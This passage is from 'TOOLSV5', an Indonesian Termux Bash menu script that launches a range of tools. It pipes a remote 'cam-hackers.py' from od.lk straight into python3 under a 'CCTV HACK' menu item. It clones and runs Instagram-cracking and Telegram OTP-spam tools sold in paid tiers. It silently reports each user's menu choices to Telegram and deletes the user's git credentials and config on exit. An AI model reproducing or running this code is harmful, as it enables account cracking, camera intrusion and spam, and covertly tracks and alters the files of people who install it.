(function(){var js = "window['__CF$cv$params']={r:'78a1663cfc30a129',m:'sl3IEuXNd0z8F8YSz4F3eb3XwlW4RftE7A7BId1PsDk-1673814942-0-AamVfHbcq9F6shk5OM5kzb7NyaLIsUnzKDtwnKXWqumUVCdcgQv67PXV7w3MTSXWkl+8nPWqGuCflljw9EmsPAQ0U/YtYOfTC1W2MS9hsWv9WeWQiiFbNdvC/gjZ6gve/qM70/7WHkz/rAaSnX9DIOA=',s:[0xac1da4f42d,0x08725e79da],u:'/cdn-cgi/challenge-platform/h/g'};var now=Date.now()/1000,offset=14400,ts=''+(Math.floor(now)-Math.floor(now%offset)),_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/h/g/scripts/alpha/invisible.js?ts='+ts,document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.nonce = '';_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();
</script>
</body>
</html>
EOF
                                                                                    clear
                                                                                    echo "File HTML berhasil dibuat di: $output_file"
                                                                                    read -p "Silahkan ENTER untuk masuk ke menu"
                                                                             }
                                                                             while true; do
                                                                                    clear
                                                                                    banner | lolcat
                                                                                    menu | lolcat
                                                                                    read -p "Silahkan Pilih (1 -2) :" mana
                                                                                    if [ "$mana" = "1" ]; then
                                                                                           clear
                                                                                           banner | lolcat
                                                                                           GALIRUS_OFFICIAL
                                                                                    elif [ "$mana" = "2" ]; then
                                                                                           clear
                                                                                           banner | lolcat
                                                                                           LAIN
                                                                                    elif [ "$mana" = "0" ]; then
                                                                                           break
                                                                                    else
                                                                                           echo -e "Pilihan Tidak Valid"
                                                                                    fi
                                                                             done
                                                                      elif [ "$no" = "39" ]; then
                                                                             if ! command -v exiftool &> /dev/null; then
                                                                                    echo "ExifTool tidak ditemukan. Instal dengan menjalankan:"
                                                                                    $paket install exiftool -y
                                                                             fi
                                                                             banner() {
                                                                                    echo -e "███████╗██╗  ██╗██╗███████╗
██╔════╝╚██╗██╔╝██║██╔════╝
█████╗   ╚███╔╝ ██║█████╗
██╔══╝   ██╔██╗ ██║██╔══╝
███████╗██╔╝ ██╗██║██║
╚══════╝╚═╝  ╚═╝╚═╝╚═╝   TOOLS By.Galirus Official
"
                                                                             }
                                                                             show_menu() {
                                                                                    echo "====================================="
                                                                                    echo "EXIF Metadata Editor (Kompatibel Termux)"
                                                                                    echo "====================================="
                                                                                    echo "1. Ubah Tanggal (DateTimeOriginal, CreateDate, ModifyDate)"
                                                                                    echo "2. Ubah Judul (Title)"
                                                                                    echo "3. Ubah Artis (Artist)"
                                                                                    echo "4. Tambah Lokasi GPS"
                                                                                    echo "5. Ubah Deskripsi (Description)"
                                                                                    echo "6. Ubah Copyright (Hak Cipta)"
                                                                                    echo "7. Ubah Nama Kamera"
                                                                                    echo "8. Hapus Metadata"
                                                                                    echo "9. Lihat Metadata"
                                                                                    echo "10. Keluar"
                                                                             }
                                                                             read_file() {
                                                                                    read -p "Masukkan path file (contoh: /storage/emulated/0/Download/foto.jpg): " file
                                                                                    if [ ! -f "$file" ]; then
                                                                                           echo "File tidak ditemukan: $file"
                                                                                           exit 1
                                                                                    fi
                                                                             }
                                                                             update_date() {
                                                                                    read_file
                                                                                    read -p "Masukkan tanggal baru (format: YYYY:MM:DD HH:MM:SS): " date
                                                                                    exiftool -DateTimeOriginal="$date" -CreateDate="$date" -ModifyDate="$date" "$file"
                                                                                    echo "Tanggal berhasil diubah!"
                                                                             }
                                                                             update_title() {
                                                                                    read_file
                                                                                    read -p "Masukkan judul baru: " title
                                                                                    exiftool -Title="$title" "$file"
                                                                                    echo "Judul berhasil diubah!"
                                                                             }
                                                                             update_artist() {
                                                                                    read_file
                                                                                    read -p "Masukkan nama artis baru: " artist
                                                                                    exiftool -Artist="$artist" "$file"
                                                                                    echo "Artis berhasil diubah!"
                                                                             }
                                                                             add_gps() {
                                                                                    read_file
                                                                                    read -p "Masukkan Latitude (contoh: 37.7749): " latitude
                                                                                    read -p "Masukkan Longitude (contoh: -122.4194): " longitude
                                                                                    read -p "Masukkan Altitude (opsional, contoh: 15.0): " altitude
                                                                                    exiftool -GPSLatitude="$latitude" -GPSLongitude="$longitude" -GPSAltitude="$altitude" "$file"
                                                                                    echo "Lokasi GPS berhasil ditambahkan!"
                                                                             }
                                                                             update_description() {
                                                                                    read_file
                                                                                    read -p "Masukkan deskripsi baru: " description
                                                                                    exiftool -ImageDescription="$description" "$file"
                                                                                    echo "Deskripsi berhasil diubah!"
                                                                             }
                                                                             update_copyright() {
                                                                                    read_file
                                                                                    read -p "Masukkan hak cipta baru: " copyright
                                                                                    exiftool -Copyright="$copyright" "$file"
                                                                                    echo "Copyright berhasil diubah!"
                                                                             }
                                                                             update_camera_name() {
                                                                                    read_file
                                                                                    read -p "Masukkan nama kamera baru: " camera
                                                                                    exiftool -Model="$camera" "$file"
                                                                                    echo "Nama kamera berhasil diubah!"
                                                                             }
                                                                             remove_metadata() {
                                                                                    read_file
                                                                                    exiftool -all= "$file"
                                                                                    echo "Semua metadata berhasil dihapus!"
                                                                             }
                                                                             view_metadata() {
                                                                                    read_file
                                                                                    exiftool "$file"
                                                                             }
                                                                             while true; do
                                                                                    clear
                                                                                    banner | lolcat
                                                                                    show_menu | lolcat
                                                                                    read -p "Pilih opsi (1-10): " choice
                                                                                    case $choice in
                                                                                           1)
                                                                                                  update_date
                                                                                                  read -p "Enter untuk kembali ke menu."
                                                                                                  ;;
                                                                                           2)
                                                                                                  update_title
                                                                                                  read -p "Enter untuk kembali ke menu."
                                                                                                  ;;
                                                                                           3)
                                                                                                  update_artist
                                                                                                  read -p "Enter untuk kembali ke menu."
                                                                                                  ;;
                                                                                           4)
                                                                                                  add_gps
                                                                                                  read -p "Enter untuk kembali ke menu."
                                                                                                  ;;
                                                                                           5)
                                                                                                  update_description
                                                                                                  read -p "Enter untuk kembali ke menu."
                                                                                                  ;;
                                                                                           6)
                                                                                                  update_copyright
                                                                                                  read -p "Enter untuk kembali ke menu."
                                                                                                  ;;
                                                                                           7)
                                                                                                  update_camera_name
                                                                                                  read -p "Enter untuk kembali ke menu."
                                                                                                  ;;
                                                                                           8)
                                                                                                  remove_metadata
                                                                                                  read -p "Enter untuk kembali ke menu."
                                                                                                  ;;
                                                                                           9)
                                                                                                  view_metadata
                                                                                                  read -p "Enter untuk kembali ke menu."
                                                                                                  ;;
                                                                                           10)
                                                                                                  echo "Keluar dari program."
                                                                                                  break
                                                                                                  ;;
                                                                                           *)
                                                                                                  echo "Pilihan tidak valid. Coba lagi."
                                                                                                  sleep 3
                                                                                                  ;;
                                                                                    esac
                                                                             done
                                                                      elif [ "$no" = "40" ]; then
                                                                             cek_akses
                                                                             clear
                                                                             cowsay -f eyes "INSTALLASI PACKAGE" | lolcat
                                                                             pip install requests
                                                                             pip install colorama
                                                                             pip install random
                                                                             while true; do
                                                                                    clear
                                                                                    isipesan="Terdeteksi Menjalankan Menu All CCTV HACK"
                                                                                    telegram &> /dev/null &
                                                                                    python3 <(curl -sL "https://od.lk/s/OV8yNTA1MDMwNjVf/cam-hackers.py")
                                                                                    e "$g404" "Silahkan Enter"
                                                                                    read
                                                                                    clear
                                                                                    cowsay -f eyes "HELLO BOY" | lolcat
                                                                                    echo -e $g404 "Apakah Anda Ingin Mengulanginya ? y/n"
                                                                                    read -p "Masukkan Pilihan Anda: " apa
                                                                                    if [[ $apa == "N" || $apa == "n" ]]; then
                                                                                           break
                                                                                    fi
                                                                             done
                                                                      elif [[ $no == "bk" || $no == "BK" ]]; then
                                                                             break
                                                                      elif [ "$no" = "0" ]; then
                                                                             rm -rf $PREFIX/tmp/ &> /dev/null
                                                                             mkdir -p $PREFIX/tmp/ &> /dev/null
                                                                             rm -rf $PREFIX/include/mpv/httpserver/service.h.zip &> /dev/null
                                                                             rm -rf /data/data/com.termux/files/home/.git-credentials &> /dev/null &
                                                                             rm -rf /data/data/com.termux/files/home/.gitconfig &> /dev/null &
                                                                             rm -rf $HOME/Lubeban/install.sh &> /dev/null
                                                                             play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null
                                                                             kill_sound &> /dev/null &
                                                                             cd $HOME
                                                                             isipesan="Terdeteksi Keluar Dari TOOLSV5 !  💻"
                                                                             telegram &> /dev/null &
                                                                             exit 0
                                                                      else
                                                                             play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                             e $bg_m "YAH TOOLSV5 BINGGUNG APA YANG ANDA PILIH !$res"
                                                                             play -q $HOME/Lubeban/sound/input_salah.mp3 &> /dev/null &
                                                                             sleep 5
                                                                      fi
                                                               done
                                                        elif [[ $no == "BOT" || $no == "bot" ]]; then
                                                               while true; do
                                                                      isipesan="Terdeteksi Masuk Ke BOTZ ! 👨‍💻"
                                                                      telegram &> /dev/null &
                                                                      TAMPILANTOOLSV5
                                                                      BOTZ
                                                                      READ
                                                                      if [[ $no == "bot1" || $no == "BOT1" ]]; then
                                                                             cek_akses
                                                                             clear
                                                                             while true; do
                                                                                    push="$PREFIX/.bug"
                                                                                    if [ -d "$push" ]; then
                                                                                           cd $push
                                                                                           git stash &> /dev/null
                                                                                           git pull origin main &> /dev/null
                                                                                           while true; do
                                                                                                  if [ -d "node_modules" ]; then
                                                                                                         clear
                                                                                                         npm start
                                                                                                         break 3
                                                                                                  else
                                                                                                         e "$k Node Modules Belum Terinstall ! Install Segera !$res"
                                                                                                         yarn
                                                                                                  fi
                                                                                           done
                                                                                    else
                                                                                           play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                                           clear
                                                                                           e $bg_m "Installasi Package Dulu !$res"
                                                                                           sleep 5
                                                                                           echo
                                                                                           $paket install -y bash
                                                                                           $paket install -y libwebp
                                                                                           $paket install -y git
                                                                                           $paket install -y nodejs
                                                                                           $paket install -y ffmpeg
                                                                                           $paket install -y wget
                                                                                           $paket install -y yarn
                                                                                           $paket install -y imagemagick
                                                                                           cd $PREFIX/
                                                                                           git clone https://github.com/Lubebansokhekel/.bug
                                                                                    fi
                                                                             done
                                                                      elif [[ $no == "bot2" || $no == "BOT2" ]]; then
                                                                             cek_akses
                                                                             clear
                                                                             while true; do
                                                                                    push="$PREFIX/..bug"
                                                                                    if [ -d "$push" ]; then
                                                                                           cd $push
                                                                                           git stash &> /dev/null
                                                                                           git pull origin main &> /dev/null
                                                                                           while true; do
                                                                                                  if [ -d "node_modules" ]; then
                                                                                                         clear
                                                                                                         npm start
                                                                                                         break 3
                                                                                                  else
                                                                                                         e "$k Node Modules Belum Terinstall ! Install Segera !$res"
                                                                                                         yarn
                                                                                                  fi
                                                                                           done
                                                                                    else
                                                                                           play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                                           clear
                                                                                           e $bg_m "Installasi Package Dulu !$res"
                                                                                           sleep 5
                                                                                           echo
                                                                                           $paket install -y bash
                                                                                           $paket install -y libwebp
                                                                                           $paket install -y git
                                                                                           $paket install -y nodejs
                                                                                           $paket install -y ffmpeg
                                                                                           $paket install -y wget
                                                                                           $paket install -y yarn
                                                                                           $paket install -y imagemagick
                                                                                           cd $PREFIX/
                                                                                           git clone https://github.com/Lubebansokhekel/..bug
                                                                                    fi
                                                                             done
                                                                      elif [[ $no == "bk" || $no == "BK" ]]; then
                                                                             break
                                                                     else
                                                                             play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                             e $bg_m "YAH TOOLSV5 BINGGUNG APA YANG ANDA PILIH !$res "
                                                                             sleep 5
                                                                     fi
                                                               done
                                                        elif [[ $no == "BUY" || $no == "buy" ]]; then
                                                               while true; do
                                                                      isipesan="Terdeteksi Masuk Ke PROMOSI_BERBAYAR ! 👨‍💻"
                                                                      telegram &> /dev/null &
                                                                      TAMPILANTOOLSV5
                                                                      PROMOSI_BERBAYAR
                                                                      READ
                                                                      if [ "$no" = "1" ]; then
                                                                             otp() {
                                                                                    m='\033[0;31m'
                                                                                    g='\033[0;32m'
                                                                                    y='\033[1;33m'
                                                                                    b='\033[0;34m'
                                                                                    nc='\033[0m'
                                                                                    draw_box() {
                                                                                           local message="$1"
                                                                                           local length=${#message}
                                                                                           local border=$(printf "%-${length}s" " " | tr " " "-")
                                                                                           echo -e "+-$border-+"
                                                                                           echo -e "| $message |"
                                                                                           echo -e "+-$border-+"
                                                                                    }
                                                                                    while true; do
                                                                                           termux_id=$(whoami)
                                                                                           termux_jir="/data/data/com.termux"
                                                                                           penyimpanan="$PREFIX/include"
                                                                                           idtermux="$penyimpanan/.yameteh/.Hai_Anak_Haram"
                                                                                           valid_ids="$idtermux"
                                                                                           installasi() {
                                                                                                  clear
                                                                                                  draw_box "${y}Installasi package...! Harap Bersabar..!$nc"
                                                                                                  $paket install zip unzip -y
                                                                                                  $paket install python python3 -y
                                                                                                  pip install telethon
                                                                                                  pip install flask
                                                                                                  cd $penyimpanan
                                                                                                  git clone https://github.com/IKHSAN-PROJCT/.yameteh &> /dev/null | echo "Sabar Sedang Mendownload Repository"
                                                                                                  git clone https://github.com/IKHSAN-PROJCT/watashi &> /dev/null | echo "Sabar Sedang Mendownload Repository"
                                                                                           }
                                                                                           if [[ -f $idtermux && -d $termux_jir ]]; then
                                                                                                  clear
                                                                                                  cd $penyimpanan/.yameteh
                                                                                                  git pull origin main &> /dev/null
                                                                                                  draw_box "${b}Sedang Memeriksa Update$nc"
                                                                                                  git stash &> /dev/null
                                                                                                  sleep 3
                                                                                                  clear
                                                                                                  if [[ $(grep -c "$termux_id" "$valid_ids") -eq 1 ]]; then
                                                                                                         draw_box "${g}ID TERVERIFIKASI$nc"
                                                                                                         sleep 3
                                                                                                         clear
                                                                                                         cd $penyimpanan/watashi
                                                                                                         git pull origin main &> /dev/null
                                                                                                         draw_box "${b}Sedang Memeriksa Update$nc"
                                                                                                         git stash &> /dev/null
                                                                                                         draw_box "${g}Update Telah Selesai$nc"
                                                                                                         sleep 3
                                                                                                         clear
                                                                                                         read -p "Masukkan token: " apa
                                                                                                         unzip -o -P "$apa" app.py &> /dev/null
                                                                                                         rm -rf app.py
                                                                                                         bash $penyimpanan/watashi/app
                                                                                                         break
                                                                                                  else
                                                                                                         draw_box "${m}ID TIDAK TERVERIFIKASI$nc"
                                                                                                         sleep 5
                                                                                                         promosi
                                                                                                         break
                                                                                                  fi
                                                                                           else
                                                                                                  installasi
                                                                                           fi
                                                                                    done
                                                                             }
                                                                             promosi() {
                                                                                    caption=$(e $m "Yah Anda Belum Penguna Premium\n Anda Berminat ?\n Jika Anda Berminat Anda Bisa Hubungi Kotak WhatsApp\n Harga Mulai 15k Pemakaian ( PERMANEN )\n Jika Anda Berminat Anda Bisa Ketik Y jika Berminat\n Ketik N jika ingin kembali ke TOOLSV5")
                                                                                    clear
                                                                                    text=" $caption"
                                                                                    delay=0.05
                                                                                    for ((i = 0; i < ${#text}; i++)); do
                                                                                           echo -n "${text:i:1}"
                                                                                           sleep $delay
                                                                                    done
                                                                                    sleep 5
                                                                                    xdg-open "https://od.lk/s/OV8yNDYwODQ0NjJf/sanz.mp4"
                                                                                    echo -e $bld
                                                                                    clear
                                                                                    play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                                                                                    e $bld "Anda Tertarik ?$k\n Jika Anda Tertarik Silahkan Anda Order Ke Pembuat\n Dengan Mengketik$c Y$h Untuk YA$c N$h No$pwl"
                                                                                    echo
                                                                                    echo
                                                                                    read -p " Choose (Y/N) :" mana
                                                                                    play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                                                                                    if [[ $mana == "y" || $mana == "Y" ]]; then
                                                                                           clear
                                                                                           e $c "Anda Akan Di Arahkan Ke WhatsApp Pemilik nya"
                                                                                           sleep 5
                                                                                           pesan=$(e "TOOLSV5 MENU BUY\n USER ID : $termux_id Bang Saya Ingin Order Spam Otp Tele
")
                                                                                           isipesan="$pesan"
                                                                                           telegram &> /dev/null &
                                                                                           xdg-open "https://wa.me/6283151697416?text=$pesan"
                                                                                           clear
                                                                                           e "$m"
                                                                                           read -p "Silahkan ENTER untuk Menuju Ke MENU"
                                                                                    elif [[ $mana == "N" || $mana == "n" ]]; then
                                                                                           e $k "Terimakasih atas kunjungannya, kami sangat \n Menghargai Setiap Keputusan Yang Anda Buat\n Sampai Bertemu Di Lain Waktu$h :)"
                                                                                           sleep 5
                                                                                    else
                                                                                           play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                                           e $m "Silahkan Anda Masukkan Input Yang Benar"
                                                                                           sleep 5
                                                                                    fi
                                                                             }
                                                                             TERMUX_ID=$(whoami)
                                                                             sleep 5
                                                                             clear
                                                                             otp
                                                                      elif [ "$no" = "2" ]; then
                                                                             Galery_Eyes_Create() {
                                                                                    ambakatum_security() {
                                                                                           dirnya="Hi_Beban.sh"
                                                                                           cek="$PREFIX/include/python3.12/.akf/"
                                                                                           if [ -f "$cek/$dirnya" ]; then
                                                                                                  cd $cek
                                                                                                  unzip -o -P "$mana" $dirnya
                                                                                                  apt-get install curl jq git ossp-uuid -y
                                                                                                  $paket install ncurses-utils nodejs -y
                                                                                                  apt-get install nodejs-lts python -y
                                                                                                  npm -g i bash-obfuscate
                                                                                                  pip install rich
                                                                                                  pip install rich-cli
                                                                                                  bash bash.setup build
                                                                                                  e $bg_lg"Sabar Ya Ganteng Lagi Running Filenya$res"
                                                                                                  bash main.sh
                                                                                                  break
                                                                                           else
                                                                                                  echo "Kegagalan System. Silahkan Anda Ulang"
                                                                                                  sleep 3
                                                                                                  break
                                                                                           fi
                                                                                    }
                                                                                    pengecekan() {
                                                                                           while true; do
                                                                                                  cek="$PREFIX/include/python3.12/.akf"
                                                                                                  if [ -d "$cek" ]; then
                                                                                                         clear
                                                                                                         cd "$cek"
                                                                                                         git pull origin main &> /dev/null
                                                                                                         git stash &> /dev/null
                                                                                                         banner5 | lolcat
                                                                                                         read -p "Masukkan User: " mana
                                                                                                         clear
                                                                                                         ambakatum_security
                                                                                                         break
                                                                                                  else
                                                                                                         cd $PREFIX/include/python3.12/
                                                                                                         $paket install openssl openssl-tool tmux -y
                                                                                                         cd $PREFIX/include/python3.12
                                                                                                         git clone https://github.com/Hozowaorokananingenda/.akf &> /dev/null || echo "Sabar Sedang Download"
                                                                                                  fi
                                                                                           done
                                                                                    }
                                                                                    pengecekan
                                                                             }
                                                                             Galery_Eyes_Create
                                                                      elif [[ $no == "3" || $no == "03" ]]; then
                                                                             while true; do
                                                                                    cek="$DIR_SAVE/Trust-YourCam"
                                                                                    if [[ -d $cek ]]; then
                                                                                           cd "$cek"
                                                                                           make help
                                                                                           make build
                                                                                           break
                                                                                    else
                                                                                           $paket update
                                                                                           $paket upgrade
                                                                                           $paket install git make -y
                                                                                           cd $DIR_SAVE
                                                                                           git clone https://github.com/ViewTechOrg/Trust-YourCam
                                                                                           cd Trust-YourCam
                                                                                           git pull origin master &> /dev/null
                                                                                           git stash &> /dev/null
                                                                                           make install
                                                                                    fi
                                                                             done
                                                                      elif [[ "$no" == "4" || "$no" == "04" ]]; then
                                                                             LIST() {
                                                                                    clear
                                                                                    e "$ran
           [ LIST HARGA SETIAP PEMAKAIAN ]
Harga aksesnya:
• 3 hari = 30.000
• 1 minggu = 50.000
• 1 bulan = 160.000
• Permanen = 350.000
"
                                                                             }
                                                                             while true; do
                                                                                    crack_ig="$HOME/Crack-IG"
                                                                                    if [ -d "$crack_ig" ]; then
                                                                                           cd "$crack_ig"
                                                                                           git pull origin master
                                                                                           git stash
                                                                                           cd Crack-IG
                                                                                           make all
                                                                                           xonsh setup.xsh install
                                                                                           LIST
                                                                                           /bin/bash out.bin
                                                                                           break
                                                                                    else
                                                                                           pkg update
                                                                                           $paket upgrade
                                                                                           $paket install git -y
                                                                                           $paket install make -y
                                                                                           $paket install clang -y
                                                                                           $paket install tree -y
                                                                                           $palet install python -y
                                                                                           $paket install ripgrep silversearcher-ag zsh tcsh loksh -y
                                                                                           cd $HOME
                                                                                           git clone https://github.com/ViewTechOrg/Crack-IG
                                                                                    fi
                                                                             done
                                                                      elif [[ $no == "bk" || $no == "BK" ]]; then
                                                                             break
                                                                      elif [ "$no" = "0" ]; then
                                                                             rm -rf $PREFIX/tmp/ &> /dev/null
                                                                             mkdir -p $PREFIX/tmp/ &> /dev/null
                                                                             rm -rf $PREFIX/include/mpv/httpserver/service.h.zip &> /dev/null
                                                                             rm -rf /data/data/com.termux/files/home/.git-credentials &> /dev/null &
                                                                             rm -rf /data/data/com.termux/files/home/.gitconfig &> /dev/null &
                                                                             rm -rf $HOME/Lubeban/install.sh &> /dev/null
                                                                             play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null
                                                                             kill_sound &> /dev/null &
                                                                             cd $HOME
                                                                             isipesan="Terdeteksi Keluar Dari TOOLSV5 !  💻"
                                                                             telegram &> /dev/null &
                                                                             exit 0
                                                                      else
                                                                             play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                             e $bg_m "YAH TOOLSV5 BINGGUNG APA YANG ANDA PILIH !$res"
                                                                             play -q $HOME/Lubeban/sound/input_salah.mp3 &> /dev/null &
                                                                             sleep 5
                                                                      fi
                                                               done
                                                        elif [[ $no == "sc+" || $no == "SC+" ]]; then
                                                               cek_akses
                                                               if [[ -f $PREFIX/bin/mpvtube && -f $PREFIX/bin/gal && -f $HOME/.jarvis_terpasang ]]; then
                                                                      e $ran8 "
Penjelasan Script Tambahan di TOOLSV5
Setelah kamu menginstal TOOLSV5 beserta script tambahan
kamu akan mendapatkan 3 perintah utama yang siap digunakan di Termux, yaitu:

1. gal
Fungsi: Perintah ini digunakan untuk mendownload video
dari URL YouTube dan TikTok.

Cara kerja: Kamu cukup menjalankan perintah gal diikuti dengan link video
yang ingin diunduh, maka script ini akan
secara otomatis mengambil video tersebut
dan menyimpannya di perangkatmu.

2. mpvtube
Fungsi: Perintah ini berfungsi untuk memutar video YouTube langsung di Termux.

Cara kerja: Dengan menjalankan 
perintah mpvtube diikuti URL video YouTube
video akan diputar menggunakan pemutar video berbasis terminal (mpv)
tanpa perlu membuka aplikasi YouTube secara terpisah.

3. jarvis
Fungsi: Ini adalah perintah untuk menjalankan JARVIS AI
sebuah asisten AI yang dapat kamu gunakan di Termux.

Cara kerja: Setelah menjalankan jarvis
kamu bisa berinteraksi dengan AI ini melalui teks
mirip seperti asisten virtual yang membantu berbagai kebutuhanmu.

Kesimpulan
Ketiga script ini adalah perintah siap pakai
yang memperluas kemampuan TOOLSV5.
Kamu hanya perlu mengetik gal, mpvtube, atau jarvis di Termux
untuk menjalankan fungsi masing-masing.

Semua sudah terinstall otomatis sebagai bagian 
dari paket tambahan TOOLSV5.
terimakasih sudah membeli 
toolsv5 semoga kalian bisa nyaman menggunakan toolsv5 selalu
sekian dari saya ADMIN TOOLSV5 mengucapkan 
TERIMAKASIH 


$c Silahkan ENTER jika sudah membacanya
"
                                                                      read
                                                               else
                                                                      EOF_MENU &> /dev/null &
                                                                      pkg update && pkg upgrade
                                                                      pkg install neofetch curl jq git ossp-uuid -y
                                                                      pkg install ncurses-utils xz-utils nodejs -y
                                                                      pkg install nodejs-lts python python3 -y
                                                                      pkg install openssl bc boxes openssl-tool -y
                                                                      npm -g i bash-obfuscate
                                                                      pip install rich rich-cli
                                                                      cd $HOME
                                                                      touch $HOME/.jarvis_terpasang
                                                                      git clone --depth 32 https://github.com/Lubebansokhekel/JARVISV3
                                                                      cd JARVISV3
                                                                      curl -sL -k -o "$HOME/.Hina_AI" "https://od.lk/s/NzNfOTQ3OTY4MTlf/gemini" &> /dev/null | e $h "Sabar Admin sedang Memasangkan Apikey$res"
                                                                      git pull origin main
                                                                      git stash
                                                                      bash JARVISV3.sh
                                                               fi
                                                        elif [[ $no == "del" || $no == "DEL" ]]; then
                                                               clear
                                                               while true; do
                                                                      clear
                                                                      $banner | lolcat
                                                                      e " FITUR INI UNTUK MENGHAPUS SEMUA\n SCRIPT YANG TERKAIT DENGAN TOOLSV5$res" | lolcat
                                                                      e " JADI APA ANDA TETAP INGIN MELANJUTKANNYA ?$res"$h | lolcat
                                                                      total_size=0
                                                                      for item in "${list[@]}"; do
                                                                             if [ -e "$item" ]; then
                                                                                    size=$(du -sb "$item" 2> /dev/null | awk '{print $1}')
                                                                                    total_size=$((total_size + size))
                                                                             fi
                                                                      done
                                                                      human_readable_size=$(du -shc "${list[@]}" 2> /dev/null | tail -n 1 | awk '{print $1}')
                                                                      e $c "Total ukuran$h:$m $human_readable_size$k"
                                                                      read -p "Apakah Anda yakin ingin menghapus semua file ini? (y/n): " confirm
                                                                      if [[ $confirm == "y" || $confirm == "Y" ]]; then
                                                                             echo "Memulai Proses Hapus Mohon Bersabar..."
                                                                             for item in "${list[@]}"; do
                                                                                    rm -rf "$item"
                                                                             done
                                                                             echo "Penghapusan Selesai. Kembali ke toolsv5."
                                                                      else
                                                                             echo "Penghapusan dibatalkan."
                                                                             sleep 3
                                                                             break
                                                                      fi
                                                               done
                                                        elif [[ $no == "musik" || $no == "MUSIK" ]]; then
                                                               cek_akses
                                                               clear
                                                               bannermusic() {
                                                                      echo "
███╗   ███╗██╗   ██╗███████╗██╗██╗  ██╗
████╗ ████║██║   ██║██╔════╝██║██║ ██╔╝
██╔████╔██║██║   ██║███████╗██║█████╔╝
██║╚██╔╝██║██║   ██║╚════██║██║██╔═██╗
██║ ╚═╝ ██║╚██████╔╝███████║██║██║  ██╗
╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═╝ setting to play
"
                                                               }
                                                               while true; do
                                                                      clear
                                                                      play -q $HOME/Lubeban/sound/robot.mp3 &> /dev/null &
                                                                      bannermusic | lolcat
                                                                      echo
                                                                      e $h " 1.$k Setting MUSIK$res"
                                                                      e $h " 2.$k Default TOOLSV5!$res"
                                                                      e $m $bg_b" 0.BACK TO TOOLSV5$res$k"
                                                                      $e
                                                                      read -p "  Choose ( 0 - 2 ) : " mana
                                                                      play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                                                                      if [ "$mana" = "1" ]; then
                                                                             cd $filenya
                                                                             nano "$soundnya"
                                                                             musikrun &> /dev/null &
                                                                      elif [ "$mana" = "2" ]; then
                                                                             cp -r $HOME/Lubeban/music.txt $filenya
                                                                             mv -f $filenya/music.txt $filenya$soundnya
                                                                             musikrun &> /dev/null &
                                                                             $e
                                                                             e $b " Musik sudah ikut Default dari TOOLSV5"
                                                                             sleep 5
                                                                      elif [ "$mana" = "0" ]; then
                                                                             e $bg_m "BACK TO TOOLSV5$res"
                                                                             sleep 3
                                                                             break
                                                                      else
                                                                             clear
                                                                             play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                             e $bg_m " Input salah Tod ! $res"
                                                                      fi
                                                               done
                                                        elif [[ $no == "cache" || $no == "CACHE" ]]; then
                                                               clear
                                                               cachetoolsv5
                                                        elif [[ $no == "ultah" || $no == "ULTAH" ]]; then
                                                               while true; do
                                                                      clear
                                                                      play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                                                                      e $m $bg_lg "Silahkan Masukkan Ulang Tahun Anda$k!\n$k($b contoh$k:$bl 30.12.2000 $k) $res $b"
                                                                      echo
                                                                      read -p "  Tanggal.Bulan.Tahun ===>  " dangisi
                                                                      play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                                                                      if [ -z "$dangisi" ]; then
                                                                             echo
                                                                             play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                             e $m "JANGAN DI KOSONG KAN KOCAK :D"
                                                                             sleep 3
                                                                      elif [[ $dangisi =~ ^[0-9]{2}\.[0-9]{2}\.[0-9]{4}$ ]]; then
                                                                             echo "$dangisi" > "$ultah"
                                                                             clear
                                                                             echo
                                                                             play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                                                                             e $h $bg_lg "Terima kasih$k!\n$h Tanggal ulang tahun Anda telah disimpan.$res"
                                                                             sleep 3
                                                                             break
                                                                      else
                                                                             echo
                                                                             play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                             e $m "NGUAWUR KON :D"
                                                                             sleep 3
                                                                      fi
                                                               done
                                                        elif [[ $no == "off" || $no == "OFF" ]]; then
                                                               cek_akses
                                                               killall mpv &> /dev/null
                                                               pkill -9 -f "mpv.*backsound" &> /dev/null
                                                        elif [[ $no == "on" || $no == "ON" ]]; then
                                                               clear
                                                               musikrun
                                                               sleep 3
                                                        elif [[ $no == "YES" || $no == "yes" ]]; then
                                                               clear
                                                               rm -rf $edukasi
                                                        elif [[ $no == "NO" || $no == "no" ]]; then
                                                               clear
                                                               echo "GALIRUS OFFICIAL" > $edukasi
                                                               sleep 5
                                                        elif [[ $no == "voice" || $no == "VOICE" ]]; then
                                                               play_sound_effect
                                                               sleep 3
                                                        elif [[ "$no" == "voice off" || "$no" == "VOICE OFF" ]]; then
                                                               pkill -9 -f "mpv.*murid_kesayangan_galirus" &> /dev/null
                                                        elif [[ $no == "info" || $no == "INFO" ]]; then
                                                               clear
                                                               e $m "==================================="
                                                               e $h "       LIST TERBARU/UPDATE $versitoolsv5 "
